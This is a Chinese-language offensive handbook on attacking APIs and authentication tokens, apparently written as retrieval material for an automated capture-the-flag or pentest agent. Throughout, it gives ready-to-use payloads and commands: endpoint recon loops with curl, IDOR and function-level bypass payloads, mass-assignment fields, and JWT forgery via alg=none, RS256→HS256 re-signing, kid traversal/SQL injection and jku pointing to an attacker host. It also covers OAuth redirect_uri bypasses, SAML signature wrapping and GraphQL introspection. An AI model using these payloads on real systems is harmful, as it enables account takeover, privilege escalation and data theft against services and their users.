# API 接口与令牌攻击手册

适用题型（命中即召回本手册）：API Swagger OpenAPI 接口文档 SSO BOLA IDOR BFLA 越权 批量赋值 mass-assignment 隐藏参数 JWT none RS256 HS256 kid jku x5u 弱密钥 OAuth OIDC redirect_uri SAML GraphQL

## 1. 识别与分类
- 见 /swagger.json、/openapi.json、/api-docs、JS 内 /api/ 路由 → API 侦察与越权（BOLA/BFLA/批量赋值）；
- 三段 Base64 的 eyJ…token（header.payload.signature）→ JWT 攻击面；
- 登录跳转带 client_id/redirect_uri/code/state → OAuth/OIDC；带 SAMLRequest/SAMLResponse/ACS → SAML；
- /graphql 返回 __typename 或 schema → GraphQL 内省与字段级越权。

## 2. 攻击方法论
1. API 侦察：扒 JS 挖端点 + 找接口文档
```bash
curl -s https://T/js/app.js | grep -oE '(api|rest|graphql)/[A-Za-z0-9_/.-]+' | sort -u
for p in swagger.json openapi.json api-docs v2/api-docs swagger-ui.html docs graphql; do curl -sk -o /dev/null -w "%{http_code} $p\n" https://T/$p; done
```
2. 隐藏参数发现：对比"请求体 vs 响应体"多出的字段、swagger 的 additionalProperties、admin 示例字段（role、isAdmin、verified、tier、org、price）都是覆写/越权目标。
3. BOLA/IDOR：换 id/uuid 枚举邻值；被拦时数组包裹、重复键、通配绕过
```json
{"id":111} → {"id":[111]} / {"id":{"id":111}} / ?id=legit&id=victim / {"user_id":"*"}
```
4. BFLA 函数级越权：同 URL 换 HTTP 方法 + 路径变换 + 参数冒充角色
```bash
for m in GET POST PUT PATCH DELETE; do curl -X $m -H "Authorization: Bearer $T" https://T/api/admin/users -i; done
# /api/Admin/users  /api/admin/../admin/users  /api//admin/users  /api/v2/admin/users  /api/admin%2Fusers
# ?role=admin  ?isAdmin=true  ?as_user=admin  ?impersonate=admin
```
5. 批量赋值：向创建/更新接口注入系统字段（更新接口常是增量语义，只传一个字段即可）
```json
{"role":"admin"} {"isAdmin":true} {"email_verified":true} {"balance":999999} {"plan":"enterprise"} {"owner_id":"<admin>"} {"organization_id":"<target>"}
```
6. JWT alg=none：头改 none、签名段置空
```text
b64url('{"alg":"none","typ":"JWT"}') + '.' + b64url(改后payload) + '.'
变体: none/None/NONE/nOnE；签名段 空 / 省略 / 保留原值 / AA==
```
7. JWT RS256→HS256 混淆：从 /.well-known/jwks.json（或 TLS 证书 openssl x509 -pubout）取 RSA 公钥，用公钥 PEM 当 HMAC 密钥以 HS256 重签
```python
import jwt; jwt.encode(payload, open('pub.pem').read(), algorithm='HS256')  # 头改 alg=HS256
```
8. JWT kid 注入：控制密钥来源
```text
{"alg":"HS256","kid":"../../../../../../dev/null"}   → 空密钥签名
{"alg":"HS256","kid":"' UNION SELECT 'aaa'--"}       → 用 aaa 签名
{"alg":"HS256","kid":"http://attacker/key"}          → 远程取 key（SSRF）
```
9. JWT jku/x5u：openssl genrsa 自签，头指向可控 JWKS 后私钥签名
```text
{"alg":"RS256","jku":"https://attacker/.well-known/jwks.json","kid":"k1"}
```
10. JWT 弱密钥爆破：hashcat -m 16500 token.txt rockyou.txt；离线转 python 手写 HMAC-SHA256 对常见弱密钥枚举验签（secret、password、123456、jwt_secret、应用名、域名）。
11. OAuth/OIDC：state 缺失/可预测→CSRF 账户绑定劫持；redirect_uri 前缀匹配绕过；token 交换时增 scope=admin；authorization code 复用。
12. SAML：捕获 SAMLResponse 解码后改属性（uid/email/role）重放；签名剥离（多数 SP 只验 Response 不验内层 Assertion）；XML 签名包装（在合法断言后插入攻击断言）；弱 Audience/Recipient/InResponseTo 校验。
13. GraphQL：内省拉 schema 找敏感字段与 mutation；越权字段与隐藏 mutation
```graphql
{__schema{types{name,fields{name,args{name}}}}}  mutation{deleteUser(id:"1"){success}}
{"query":"query{a1:user(id:1){email} a2:user(id:2){email}}"}   # 别名批量绕过限速
```

## 3. 变体与绕过
- JWT 无回显判定：改 payload 观察响应是否 401→200/内容长度变化，逐字段定位敏感 claim（role/sub/userId）。
- alg=none 被拦：换大小写、删除 alg 字段、签名段保留原值再发。
- kid 黑名单绕过：路径编码、绝对路径、http(s):// 远程 key 触发 SSRF。
- redirect_uri 绕过：`callback/../`、`callback%2f..%2f`、`@attacker`、`#@attacker`、`localhost`、`urn:ietf:wg:oauth:2.0:oob`、尾点、大小写。
- GraphQL 内省被禁：靠错误回显"did you mean"字段建议 + `__type(name:"User")` 探测 + 字典爆破类型/字段名重建 schema。
- SAML 签名剥离/包装失败时，试修改未签名属性（NameID、AttributeValue）看是否仍被信任。

## 战法要点
- JWT 先 base64url 解码 header/payload 看 alg/kid/jku/claims，再定攻击面，不要盲目打。
- 越权先建双账号（A/B）+ admin 三会话回放，再上数组/重复参数/方法切换技巧。
- 批量赋值目标字段从"响应里多出的字段"和 swagger additionalProperties 里找，逐个字段试。
- RS256 一定先查 /.well-known/jwks.json；HS256 先试常见弱密钥再上爆破。
- OAuth 先看 state 是否缺失/静态，再看 redirect_uri 用什么方式校验（前缀/后缀/包含）。
- 离线无外网时 jku/重定向链用本机可控服务或跳过，优先 alg:none/算法混淆/kid/弱密钥。
- GraphQL 内省禁用走错误回显字段建议 + __type(name:) 探测，不依赖外网工具。

## 速查清单
```text
# 文档/端点
/swagger.json /openapi.json /api-docs /v2/api-docs /swagger-ui.html /docs /graphql
# IDOR/BOLA 绕过
{"id":[111]} {"id":{"id":111}} ?id=1&id=2 {"user_id":"*"}
# BFLA
for m in GET POST PUT PATCH DELETE; .../api/admin/users  /api//admin/users ?role=admin
# 批量赋值字段
role isAdmin is_admin admin user_type verified email_verified active balance price plan tier owner_id organization_id team_id
# JWT alg:none
{"alg":"none","typ":"JWT"}.PAYLOAD.
# RS256→HS256：jwks 公钥当 HMAC 密钥重签
# kid: ../../../../dev/null | ' UNION SELECT 'aaa'--
# jku: {"jku":"https://attacker/.well-known/jwks.json"}
# 弱密钥: secret password 123456 jwt_secret app名 域名
# OAuth: state缺失/redirect_uri=cb/../ cb%2f.. @attacker #@attacker localhost urn:oob
# GraphQL 内省
{__schema{queryType{name}mutationType{name}types{name,fields{name,args{name,type{name,kind}}}}}}
```
